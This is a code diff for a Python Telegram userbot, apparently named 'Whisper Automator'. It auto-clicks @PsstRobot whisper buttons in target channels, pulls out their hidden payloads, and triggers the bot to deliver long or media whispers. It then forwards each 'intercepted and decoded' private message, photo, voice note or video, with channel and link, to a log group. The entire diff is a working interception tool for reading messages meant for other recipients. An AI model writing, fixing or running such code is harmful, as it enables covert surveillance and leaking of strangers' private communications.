@@ -25,22 +25,12 @@ TARGET_CHANNELS = [
 WHISPER_BOT_ID = 518335359 # @PsstRobot
 LOG_GROUP_ID = -1004402300724
 
-# Context for media whispers
-context = {"chat_title": "Target Channel", "msg_link": "#", "start_time": 0}
+# Tracking context to keep link and channel name
+ctx = {"title": "Target Channel", "link": "#", "time": 0}
 
 client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
 
-# ==================== HELPER: GET MESSAGE LINK ====================
-async def get_msg_link(event):
-    try:
-        chat = await event.get_chat()
-        if getattr(chat, "username", None):
-            return f"https://t.me/{chat.username}/{event.id}"
-        return f"https://t.me/c/{str(event.chat_id).replace('-100','')}/{event.id}"
-    except:
-        return "#"
-
-# ==================== 1. CHANNEL HANDLER (AUTO-TRIGGER) ====================
+# ==================== 1. CHANNEL HANDLER (AUTO-CLICKER) ====================
 @client.on(events.NewMessage(chats=TARGET_CHANNELS))
 async def channel_handler(event):
     if not event.buttons:
@@ -48,109 +38,107 @@ async def channel_handler(event):
 
     start_time = time.perf_counter()
     chat_name = event.chat.title if event.chat else "Target Channel"
-    msg_link = await get_msg_link(event)
     
-    print(f"\n📩 WHISPER DETECTED: [{chat_name}]")
+    # Generate Message Link
+    try:
+        chat = await event.get_chat()
+        msg_link = f"https://t.me/{chat.username}/{event.id}" if getattr(chat, 'username', None) else f"https://t.me/c/{str(event.chat_id).replace('-100','')}/{event.id}"
+    except:
+        msg_link = "#"
+
+    print(f"\n📩 NEW WHISPER: [{chat_name}]")
 
     try:
-        # STEP A: Check for Advanced URL Button (The 'Manual Tap' Fix)
+        # STEP A: Check for Payload in Button URL (Deep Link)
         payload = None
         for row in event.buttons:
             for btn in row:
-                if btn.url and 'PsstRobot?start=' in btn.url:
+                if btn.url and 'start=' in btn.url:
                     payload = btn.url.split('start=')[-1]
                     break
         
-        if payload:
-            print(f"🔗 Advanced Payload found: {payload}. Simulating manual tap...")
-            context.update({"chat_title": chat_name, "msg_link": msg_link, "start_time": start_time})
-            # Simulate the manual tap by sending the start command to the bot
-            await client.send_message(WHISPER_BOT_ID, f"/start {payload}")
-            return
-
-        # STEP B: If not a URL button, try normal Click (For Short Text)
+        # STEP B: Trigger Popup to check for "Too Long" payload
         res = await event.click(0)
-        secret_text = None
+        popup_text = ""
         if hasattr(res, 'message') and res.message:
-            secret_text = res.message
+            popup_text = res.message
         elif isinstance(res, str):
-            secret_text = res
+            popup_text = res
 
-        # If popup tells us it's advanced
-        if secret_text and ("advanced" in secret_text.lower() or "-wh::" in secret_text):
-            print("🔗 Popup says Advanced. Searching for payload...")
-            match = re.search(r"-wh::[a-zA-Z0-9_=]+", secret_text)
+        # Check if popup has the secret payload (-wh::...)
+        if popup_text and "-wh::" in popup_text:
+            match = re.search(r"-wh::[a-zA-Z0-9_=]+", popup_text)
             if match:
                 payload = match.group(0)
-                context.update({"chat_title": chat_name, "msg_link": msg_link, "start_time": start_time})
-                await client.send_message(WHISPER_BOT_ID, f"/start {payload}")
-                return
 
-        # STEP C: Normal Text Success
-        if secret_text:
-            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)
-            log_payload = (
+        # STEP C: Final Execution
+        if payload or "advanced" in popup_text.lower():
+            print(f"🔗 Advanced Whisper detected. Sending payload to Bot...")
+            ctx.update({"title": chat_name, "link": msg_link, "time": start_time})
+            # Send the payload to bot to trigger DM response
+            await client.send_message(WHISPER_BOT_ID, f"/start {payload}" if payload else "/start")
+        
+        elif popup_text and "advanced" not in popup_text.lower():
+            # Normal Short Whisper
+            elapsed = round((time.perf_counter() - start_time) * 1000, 2)
+            log = (
                 f"🔓 **Whisper Intercepted & Decoded!**\n\n"
-                f"📝 **Secret Message:**\n{secret_text}\n\n"
+                f"📝 **Secret Message:**\n{popup_text}\n\n"
                 f"📍 **Channel:** {chat_name}\n"
-                f"⚡ **Speed:** {elapsed_ms} ms\n"
+                f"⚡ **Speed:** {elapsed} ms\n"
                 f"🔗 [Message Link]({msg_link})"
             )
-            await client.send_message(LOG_GROUP_ID, log_payload)
-            print(f"✅ Text Forwarded: {elapsed_ms}ms")
+            await client.send_message(LOG_GROUP_ID, log)
+            print(f"✅ Short Whisper Forwarded.")
 
     except Exception as e:
-        print(f"❌ Channel Handler Error: {e}")
+        print(f"❌ Channel Error: {e}")
 
-# ==================== 2. BOT DM HANDLER (THE FORWARDER) ====================
+# ==================== 2. BOT DM HANDLER (MEDIA FORWARDER) ====================
 @client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
 async def bot_dm_handler(event):
-    # Filter out bot's own setup messages
-    if event.message.text and any(x in event.message.text for x in ["Preparing", "Everyone", "Click the button", "/start"]):
+    # Skip bot's welcome/instruction messages
+    if event.message.text and any(x in event.message.text for x in ["Preparing", "Everyone", "/start", "button below"]):
         return
 
-    print(f"📩 MEDIA/LONG MSG RECEIVED IN DM!")
+    print(f"📩 MEDIA/LONG MESSAGE RECEIVED FROM BOT DM!")
 
     try:
         now = time.perf_counter()
-        # If context is blank or too old, just use current time
-        if now - context["start_time"] > 300: 
-            context["start_time"] = now
+        if now - ctx["time"] > 60: ctx["time"] = now # Fallback
+        
+        elapsed = round((now - ctx["time"]) * 1000, 2)
+        m_type = "Long Message"
+        if event.photo: m_type = "Photo"
+        elif event.voice: m_type = "Voice Note"
+        elif event.video: m_type = "Video"
 
-        elapsed_ms = round((now - context["start_time"]) * 1000, 2)
-        
-        media_type = "Advanced Whisper"
-        if event.photo: media_type = "Photo"
-        elif event.voice: media_type = "Voice Note"
-        elif event.video: media_type = "Video"
-        
-        log_payload = (
+        log = (
             f"🔓 **Whisper Intercepted & Decoded!**\n\n"
-            f"📝 **Secret Message:**\n[Advanced {media_type}]\n"
+            f"📝 **Secret Message:**\n[Advanced {m_type}]\n"
             f"{event.message.text if event.message.text else ''}\n\n"
-            f"📍 **Channel:** {context['chat_title']}\n"
-            f"⚡ **Speed:** {elapsed_ms} ms\n"
-            f"🔗 [Message Link]({context['msg_link']})"
+            f"📍 **Channel:** {ctx['title']}\n"
+            f"⚡ **Speed:** {elapsed} ms\n"
+            f"🔗 [Message Link]({ctx['link']})"
         )
 
-        # Forward everything (Media + Caption)
-        await client.send_message(LOG_GROUP_ID, log_payload, file=event.message.media if event.message.media else None)
+        # Send Media + Caption to Log Group
+        await client.send_message(LOG_GROUP_ID, log, file=event.message.media if event.message.media else None)
         await client.send_read_acknowledge(event.chat_id)
-        print(f"✅ Success: Advanced content forwarded to GC!")
+        print(f"✅ Advanced Whisper Forwarded.")
 
     except Exception as e:
-        print(f"❌ DM Handler Error: {e}")
+        print(f"❌ DM Error: {e}")
 
-# ==================== WEB SERVER & STARTUP ====================
-async def handle_ping(request): return web.Response(text="Active")
+# ==================== STARTUP & WEB SERVER ====================
+async def handle_ping(request): return web.Response(text="Bot Active")
 async def main():
     await client.start()
     app = web.Application(); app.router.add_get("/", handle_ping)
     runner = web.AppRunner(app); await runner.setup()
     await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()
     await client.get_dialogs()
-    print("🚀 Whisper Automator: Online & Auto-Trigger Active!")
+    print("🚀 Whisper Automator: PRO Engine Active (Auto-Tap Fixed)!")
     await client.run_until_disconnected()
 
-if __name__ == "__main__":
-    asyncio.run(main())
+if __name__ == "__main__": asyncio.run(main())
